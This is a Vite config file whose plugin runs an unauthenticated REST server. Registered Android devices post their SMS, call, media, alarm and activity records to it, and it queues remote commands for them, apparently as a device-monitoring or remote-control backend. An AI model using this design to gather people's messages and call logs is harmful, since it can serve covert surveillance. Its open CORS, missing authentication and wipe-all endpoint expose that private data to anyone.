import { defineConfig, Plugin } from 'vite'
import react from '@vitejs/plugin-react'
import fs from 'fs'
import path from 'path'

// In-memory / file-persisted Local REST server plugin to bridge Android devices directly
function localRestServerPlugin(): Plugin {
  const storeFilePath = path.resolve(__dirname, 'local_store.json')
  
  interface LocalStore {
    devices: any[]
    permissions: Record<string, any>
    sms_records: any[]
    call_records: any[]
    media_records: any[]
    alarms: any[]
    activity_logs: any[]
    commands: any[]
  }

  const loadStore = (): LocalStore => {
    try {
      if (fs.existsSync(storeFilePath)) {
        return JSON.parse(fs.readFileSync(storeFilePath, 'utf-8'))
      }
    } catch (e) {
      console.error('Error loading local_store.json', e)
    }
    return {
      devices: [],
      permissions: {},
      sms_records: [],
      call_records: [],
      media_records: [],
      alarms: [],
      activity_logs: [],
      commands: []
    }
  }

  const saveStore = (store: LocalStore) => {
    try {
      fs.writeFileSync(storeFilePath, JSON.stringify(store, null, 2), 'utf-8')
    } catch (e) {
      console.error('Error saving local_store.json', e)
    }
  }

  return {
    name: 'local-rest-server',
    configureServer(server) {
      server.middlewares.use((req, res, next) => {
        // Handle CORS
        res.setHeader('Access-Control-Allow-Origin', '*')
        res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PATCH, PUT, DELETE, OPTIONS')
        res.setHeader('Access-Control-Allow-Headers', 'Content-Type, apikey, Authorization, Prefer')

        if (req.method === 'OPTIONS') {
          res.statusCode = 204
          res.end()
          return
        }

        const url = req.url || ''

        // Only handle /rest/v1/ or /api/
        if (!url.startsWith('/rest/v1/') && !url.startsWith('/api/')) {
          return next()
        }

        let bodyBuffer = ''
        req.on('data', chunk => {
          bodyBuffer += chunk
        })

        req.on('end', () => {
          const store = loadStore()
          let parsedBody: any = null
          if (bodyBuffer) {
            try {
              parsedBody = JSON.parse(bodyBuffer)
            } catch (e) {
              parsedBody = null
            }
          }

          res.setHeader('Content-Type', 'application/json')

          // Route: /rest/v1/devices or /api/devices
          if (url.includes('/devices')) {
            if (req.method === 'POST') {
              const item = parsedBody
              if (item) {
                const existingIdx = store.devices.findIndex(d => d.device_id === item.device_id)
                const deviceRecord = {
                  id: item.device_id,
                  device_id: item.device_id,
                  device_name: item.device_name || `${item.manufacturer} ${item.model}`,
                  manufacturer: item.manufacturer || 'Unknown',
                  model: item.model || 'Unknown',
                  android_version: item.android_version || 'Android',
                  app_version: item.app_version || '1.0.0',
                  battery: item.battery ?? item.batteryLevel ?? 100,
                  is_charging: item.is_charging ?? false,
                  network_status: item.network_status || 'Online',
                  status: 'online',
                  last_seen: new Date().toISOString(),
                  registered_at: existingIdx >= 0 ? store.devices[existingIdx].registered_at : new Date().toISOString()
                }

                if (existingIdx >= 0) {
                  store.devices[existingIdx] = deviceRecord
                } else {
                  store.devices.unshift(deviceRecord)
                }

                saveStore(store)
              }
              res.statusCode = 201
              res.end(JSON.stringify({ status: 'success' }))
              return
            }

            if (req.method === 'GET') {
              res.statusCode = 200
              res.end(JSON.stringify(store.devices))
              return
            }

            if (req.method === 'DELETE') {
              store.devices = []
              store.permissions = {}
              store.sms_records = []
              store.call_records = []
              store.media_records = []
              store.alarms = []
              store.activity_logs = []
              store.commands = []
              saveStore(store)
              res.statusCode = 200
              res.end(JSON.stringify({ message: 'All devices cleared' }))
              return
            }
          }

          // Route: /rest/v1/permissions
          if (url.includes('/permissions')) {
            if (req.method === 'POST') {
              if (parsedBody && parsedBody.device_id) {
                store.permissions[parsedBody.device_id] = {
                  ...parsedBody,
                  id: `p-${parsedBody.device_id}`,
                  updated_at: new Date().toISOString()
                }
                saveStore(store)
              }
              res.statusCode = 201
              res.end(JSON.stringify({ status: 'success' }))
              return
            }

            if (req.method === 'GET') {
              res.statusCode = 200
              res.end(JSON.stringify(store.permissions))
              return
            }
          }

          // Route: /rest/v1/commands
          if (url.includes('/commands')) {
            if (req.method === 'POST') {
              const newCmd = {
                id: `cmd-${Date.now()}-${Math.random().toString(36).substring(2, 7)}`,
                device_id: parsedBody.device_id,
                command: parsedBody.command,
                payload: parsedBody.payload || null,
                status: 'PENDING',
                result: null,
                created_at: new Date().toISOString(),
                executed_at: null
              }
              store.commands.push(newCmd)
              saveStore(store)
              res.statusCode = 201
              res.end(JSON.stringify(newCmd))
              return
            }

            if (req.method === 'GET') {
              // Parse URL search params e.g. device_id=eq.DEVICE-123&status=eq.PENDING
              const urlObj = new URL(url, 'http://localhost')
              let filtered = [...store.commands]
              
              for (const [key, val] of urlObj.searchParams.entries()) {
                if (key === 'device_id') {
                  const devId = val.replace('eq.', '')
                  filtered = filtered.filter(c => c.device_id === devId)
                }
                if (key === 'status') {
                  const status = val.replace('eq.', '')
                  filtered = filtered.filter(c => c.status === status)
                }
              }

              res.statusCode = 200
              res.end(JSON.stringify(filtered))
              return
            }

            if (req.method === 'PATCH') {
              const urlObj = new URL(url, 'http://localhost')
              const cmdIdParam = urlObj.searchParams.get('id')
              const targetId = cmdIdParam ? cmdIdParam.replace('eq.', '') : null

              if (targetId) {
                const cmd = store.commands.find(c => c.id === targetId)
                if (cmd) {
                  cmd.status = parsedBody.status || cmd.status
                  cmd.result = parsedBody.result || cmd.result
                  cmd.executed_at = parsedBody.executed_at || new Date().toISOString()
                  saveStore(store)
                }
              }
              res.statusCode = 200
              res.end(JSON.stringify({ status: 'updated' }))
              return
            }
          }

          // Route: /rest/v1/sms_records
          if (url.includes('/sms_records')) {
            if (req.method === 'POST') {
              const items = Array.isArray(parsedBody) ? parsedBody : [parsedBody]
              items.forEach(it => {
                store.sms_records.unshift({
                  ...it,
                  id: `sms-${Date.now()}-${Math.random().toString(36).substring(2, 5)}`
                })
              })
              saveStore(store)
              res.statusCode = 201
              res.end(JSON.stringify({ status: 'success' }))
              return
            }
            if (req.method === 'GET') {
              res.statusCode = 200
              res.end(JSON.stringify(store.sms_records))
              return
            }
          }

          // Route: /rest/v1/call_records
          if (url.includes('/call_records')) {
            if (req.method === 'POST') {
              const items = Array.isArray(parsedBody) ? parsedBody : [parsedBody]
              items.forEach(it => {
                store.call_records.unshift({
                  ...it,
                  id: `call-${Date.now()}-${Math.random().toString(36).substring(2, 5)}`
                })
              })
              saveStore(store)
              res.statusCode = 201
              res.end(JSON.stringify({ status: 'success' }))
              return
            }
            if (req.method === 'GET') {
              res.statusCode = 200
              res.end(JSON.stringify(store.call_records))
              return
            }
          }

          // Route: /rest/v1/media_records
          if (url.includes('/media_records')) {
            if (req.method === 'POST') {
              const items = Array.isArray(parsedBody) ? parsedBody : [parsedBody]
              items.forEach(it => {
                store.media_records.unshift({
                  ...it,
                  id: `media-${Date.now()}-${Math.random().toString(36).substring(2, 5)}`
                })
              })
              saveStore(store)
              res.statusCode = 201
              res.end(JSON.stringify({ status: 'success' }))
              return
            }
            if (req.method === 'GET') {
              res.statusCode = 200
              res.end(JSON.stringify(store.media_records))
              return
            }
          }

          // Route: /rest/v1/alarms
          if (url.includes('/alarms')) {
            if (req.method === 'POST') {
              const items = Array.isArray(parsedBody) ? parsedBody : [parsedBody]
              items.forEach(it => {
                store.alarms.unshift({
                  ...it,
                  id: `alarm-${Date.now()}-${Math.random().toString(36).substring(2, 5)}`
                })
              })
              saveStore(store)
              res.statusCode = 201
              res.end(JSON.stringify({ status: 'success' }))
              return
            }
            if (req.method === 'GET') {
              res.statusCode = 200
              res.end(JSON.stringify(store.alarms))
              return
            }
          }

          // Route: /rest/v1/activity_logs
          if (url.includes('/activity_logs')) {
            if (req.method === 'POST') {
              const items = Array.isArray(parsedBody) ? parsedBody : [parsedBody]
              items.forEach(it => {
                store.activity_logs.unshift({
                  ...it,
                  id: `log-${Date.now()}-${Math.random().toString(36).substring(2, 5)}`
                })
              })
              saveStore(store)
              res.statusCode = 201
              res.end(JSON.stringify({ status: 'success' }))
              return
            }
            if (req.method === 'GET') {
              res.statusCode = 200
              res.end(JSON.stringify(store.activity_logs))
              return
            }
          }

          // Default fallback
          res.statusCode = 404
          res.end(JSON.stringify({ error: 'Endpoint not found' }))
        })
      })
    }
  }
}

// https://vitejs.dev/config/
export default defineConfig({
  plugins: [react(), localRestServerPlugin()],
  server: {
    host: '0.0.0.0',
    port: 3000,
    open: false
  }
})
